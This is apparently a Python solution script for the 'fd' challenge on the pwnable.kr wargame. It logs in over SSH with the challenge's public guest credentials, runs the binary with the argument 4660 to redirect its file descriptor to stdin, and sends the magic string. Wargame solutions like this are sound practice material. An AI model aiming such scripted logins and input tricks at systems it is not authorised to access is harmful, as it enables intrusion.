import paramiko

hostname = "pwnable.kr"
port = 2222
username = "fd"
password = "guest"

command = "~/fd 4660"

try:
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh_client.connect(hostname, port, username, password)

    print(f"Executing: {command}")
    stdin, stdout, stderr = ssh_client.exec_command(command)
    stdin.write("LETMEWIN\n")
    print("OUTPUT:", stdout.read().decode())

    ssh_client.close()
    print("connection closed")
except Exception as why:
    print(f"ERROR: {why}")
